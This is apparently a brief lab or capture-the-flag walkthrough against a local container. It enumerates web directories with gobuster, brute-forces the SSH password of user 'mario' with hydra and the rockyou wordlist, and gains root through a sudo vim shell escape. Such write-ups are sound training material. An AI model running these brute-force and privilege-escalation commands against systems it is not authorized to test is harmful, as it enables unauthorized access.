### Step 1
We are start doing an scanig map

We can see that it has the ports 80/http and 22/ssh, let's watch what is in the web page.
![[Pasted image 20240720123851.png]]

It have a default apacher page.
![[Pasted image 20240720124218.png]]
### Step 2
Let's foud directories with **gobuste**.
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.2 -x txt,php,html
```

![[Pasted image 20240720124635.png]]
In secret.php we found a name "Mario" that we can use to login in ssh, but first we need to get the password.
![[Pasted image 20240720124959.png]]

### Step 3
Let's use hydra to search the password.
```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```
![[Pasted image 20240720125142.png]]
The password is **chocolate**, now we can login.
![[Pasted image 20240720125313.png]]
### Step 4
#### Now let's escalate privileges.
Enlist how mario can run sudo comands.
![[Pasted image 20240720125646.png]]

Let's look in GTFOBins a way to spawn a shell with privileges.
![[Pasted image 20240720130122.png]]
```
sudo vim -c ':!/bin/sh'
```

Now we can run comads with root.
![[Pasted image 20240720130347.png]]